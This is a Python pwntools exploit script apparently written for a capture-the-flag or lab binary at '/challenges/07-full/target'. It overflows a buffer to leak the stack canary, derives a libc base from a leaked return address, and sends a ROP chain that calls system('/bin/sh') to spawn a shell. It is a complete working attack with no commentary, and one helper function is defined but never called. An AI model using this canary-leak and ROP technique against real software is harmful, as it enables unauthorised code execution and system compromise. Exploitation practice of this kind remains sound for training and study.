#!/usr/bin/env python3
from pwn import *
import os


# p = process('/challenges/06-chain/target', stderr=2)
p = process(['/challenges/07-full/target'],stderr=2)
e = ELF('/challenges/07-full/target')
# libc = ELF(p.libc.path)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
print("Libc path: ", libc)

offset_of_function  =0x29d10 ## offset of __libc_start_call_main
print(f"Function offset: {hex(offset_of_function)}")

# offset = 100
# buffer_addr = e.bss(offset)
# print("bss addr: ", hex(buffer_addr)) # 0x000000000404060

pop_rdi = 0x0000000000001323         # pop rdi; ret
ret = 0x0000000000001016             # ret; 
pop_rsi_pop_r15 = 0x0000000000001321 # pop rsi; pop r15; ret
pop_rdx_pop_r12 = 0x000000000011f2e7 # pop rdx; pop r12; ret (libc)


def leak_canary():
    p.readline()
    payload = b'A' * 0x69  
    p.send(payload)
    canary_str = p.readline()
    print(canary_str)
    canary_str = canary_str[-8:]
    print(canary_str)
    canary_str_stripped = canary_str.strip()
    canary = u64(canary_str_stripped.rjust(8,b'\x00'))
    print("Canary: ",{hex(canary)})
    return canary_str_stripped, len(canary_str_stripped)

def leak_pie_base(canary, length):
    p.readline()
    print(length)
    payload = b"A" * 0x68 + b"C" *(8-length) + canary + b"B" * 24
    p.send(payload)
    rip_str = p.readline()
    print(rip_str)
    rip_offset = rip_str.find(b"B" * 24)
    print(rip_offset)
    rip_addr_str = rip_str[rip_offset+24:]
    print(rip_addr_str)
    rip_addr_str = rip_addr_str.strip().ljust(8, b'\x00')
    print(rip_addr_str)
    rip_addr = u64(rip_addr_str)
    print("rip_addr: ", hex(rip_addr))
    libc_start_call_main_addr = rip_addr - 128
    print("libc_start_call_main_addr: ", hex(libc_start_call_main_addr))
    pie_base = libc_start_call_main_addr - offset_of_function
    print("PIE Base: ",hex(pie_base))
    return pie_base

def leak_libc_base(canary, length):
    p.readline()
    print(length)
    payload = b"q\x0A" + b"A" * 0x66 + b"\x00" *(8-length) + canary + b"\x00" * 24
    payload += p64(pop_rdi)
    payload += p64(e.got['__libc_start_main'])
    payload += p64(e.symbols['puts'])
    payload += p64(e.symbols['_start'])
    print(payload)
    p.send(payload)
    anystring = p.readline()
    print(anystring)
    p.interactive()
    anyanystring = p.readline()
    print(anyanystring)
    libc_start_main_str = p.readline()
    print(libc_start_main_str)
    libc_start_main = u64(libc_start_main_str.strip().ljust(8, b'\x00'))
    print(hex(libc_start_main))

    libc_base = libc_start_main - libc.symbols['__libc_start_main']
    print("LIBC_BASE: 0x%x" % libc_base)
    return libc_base


def exploit(canary, length, pie_base):
    p.readline()
    pop_rdi = 0x000000000002a3e5         # pop rdi; ret (libc)
    ret = 0x0000000000029139             # ret; (libc)
    pop_rsi = 0x000000000002be51 # pop rsi; ret (libc)
    pop_rdx_pop_r12 = 0x000000000011f2e7 # pop rdx; pop r12; ret (libc)

    pop_rdi += pie_base
    ret += pie_base
    bin_sh = pie_base + next(libc.search(b'/bin/sh'))
    system = pie_base + libc.symbols['system']
    
    # ROP Chain
    # payload = b"q" + b"A" * 0x67 + b"\x00" *(8-length) + canary + b"\x00" * 24
    payload = b'q'
    payload += b"A" * 0x67
    payload += b"\x00" * (8-length)
    payload += canary
    payload += b"\x00" * 24
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(ret)
    payload += p64(system)
    print(payload)
    
    p.send( payload)
    p.interactive()


canary, canary_length= leak_canary()
pie_base = leak_pie_base(canary, canary_length)
pause()

exploit(canary, canary_length, pie_base)

p.interactive()